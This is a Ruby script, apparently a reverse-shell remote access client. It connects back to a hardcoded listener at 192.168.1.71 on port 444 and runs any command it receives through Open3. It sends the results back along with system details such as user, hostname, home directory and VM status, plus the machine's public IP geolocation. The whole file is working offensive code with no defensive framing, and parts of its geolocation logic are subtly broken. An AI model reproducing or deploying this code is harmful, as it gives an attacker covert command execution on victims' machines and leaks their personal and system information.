#!/usr/bin/ruby
#-*- coding:utf-8 -*-
#Author : Dxvistxr - Unamed

require 'open3'
require 'socket'
require 'fileutils'
require 'pp'
require 'net/http'
require 'json'
require 'os'
require 'sysinfo'

def ipgeo()
  $ip = Net::HTTP.get_response('ifconfig.me','/ip')
  target_ip = $ip.body
  send_requests = Net::HTTP.get_response('ipinfo.io','/#{target_ip}/geo')
  data = JSON.parse(send_requests.body)
  ip_re = data['ip']
  city = data['city']
  region = data['region']
  country = data['country']
  location = data['loc']
  postal = data['postal']
  $s.print("[*] IP : #{ip_re}\n[*] CITY : #{city}\n[*] REGION : #{region}\n[*] COUNTRY : #{country}\n[*] LOCATION : #{location}\n[*] POSTAL : #{postal}\n")
end


def system_info()
  sysinfo = SysInfo.new
  vm_detected = sysinfo.vm
  os_detected = sysinfo.os
  sys_detected = sysinfo.impl
  arch_detected = sysinfo.arch
  user_detected = sysinfo.user
  home_detected = sysinfo.home
  uptime_detected = sysinfo.uptime
  shell_detected = sysinfo.shell
  hostname_detected = sysinfo.hostname
  local_ip = sysinfo.ipaddress_internal
  public_ip = $target_ip
  $s.puts("[*] VM : #{vm_detected}\n[*] OS : #{os_detected}\n[*] SYSTEM : #{sys_detected}\n[*] ARCH : #{arch_detected}\n[*] USER : #{user_detected}\n[*] HOME : #{home_detected}\n[*] UPTIME : #{uptime_detected}\n[*] SHELL : #{shell_detected}\n")
end

def connect(host,port)
  $s = TCPSocket.new(host, port)
  $s.puts("\033[1;91m[\033[1;92m+\033[1;91m] Client Connected #{$target_ip}")

  while true
    data = $s.recv(4096)

    if data.start_with? "pwd"
      $s.puts("Pwd : #{Dir.pwd}")

    elsif data.start_with? "cd"
      data_cd = data.split(' ')[1]
      path_check = File.directory? data_cd
      if path_check ==true
        FileUtils.cd(data_cd)
        $s.puts("Dirrectory Changed !")
      else
        $s.puts("\033[1;91m[!] Path Not Found")
      end

    elsif data.start_with? "sysinfo"
      begin
        system_info()
      rescue Exception
        puts("[!] Exception SYSINFO")
      end


    elsif data.start_with? "ipgeo"
      begin
        ipgeo()
      rescue Exception
        puts("[!] Exception IPGEO")
      end

    elsif data.start_with? "quit"
      $s.close()
      break

    else
      stdout, stderr, stdin, command = Open3.capture3(data)
      $s.puts stdout+stderr

    end
  end
end


def main()
  remote_ip = "192.168.1.71"
  remote_port = 444
  begin
    connect(remote_ip,remote_port)
  rescue SignalException
    puts "Error SignalException"
  rescue Exception
    puts "Exception Connect !"
  end
end

if __FILE__ == $0
  main()
end
